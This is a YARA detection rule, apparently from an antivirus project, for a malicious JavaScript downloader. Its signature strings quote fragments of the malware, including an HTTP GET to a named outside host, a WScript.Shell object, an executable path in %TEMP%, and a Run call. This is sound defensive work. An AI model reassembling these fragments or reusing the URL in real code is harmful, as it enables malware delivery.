rule sig_20160330_6bd487630aec29a450dd1bc5d6d891e4 {
  meta:
    description = "datamaliciousorder - file 20160330_6bd487630aec29a450dd1bc5d6d891e4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3d0fa327234441023c178d3f9bc7d6dd052b268941e3b6136267ef35d3488165"

  strings:
    $s1  = "H[HG](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "function J(Z0, K){S = S * 1; return Z0 - K;};" fullword ascii
    $s3  = "var B1 = function LQ() {return WScript[Y](\"WScript\"+\".Shell\");}(), A = 11;" fullword ascii
    $s4  = "if (H[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function E() {return B1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uVB1cpPcsEPvFKRi.ex\" + \"e\";};" fullword ascii
    $s6  = "function FC(){return R + \"\";};" fullword ascii
    $s7  = "function E0(L0){B1[\"Run\"](L0, S, S);};" fullword ascii
    $s8  = "function CO() {return ((D0 == true) && (D0 == X)) ? 1 : S;};" fullword ascii
    $s9  = "var D = new this[\"Date\"]();" fullword ascii
    $s10 = "function ZK(){return 22;};" fullword ascii
    $s11 = "}while (MA);" fullword ascii
    $s12 = "function PH(YC) {var G = (1, 2, 3, 4, 5, YC); return G;};" fullword ascii
    $s13 = "function IA()" fullword ascii
    $s14 = "function C(){return Y;};" fullword ascii
    $s15 = "return J(R0, B0);" fullword ascii
    $s16 = "var D0 = false;" fullword ascii
    $s17 = "var PI0 = false;" fullword ascii
    $s18 = "D0 = true; " fullword ascii
    $s19 = "} catch(R1){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}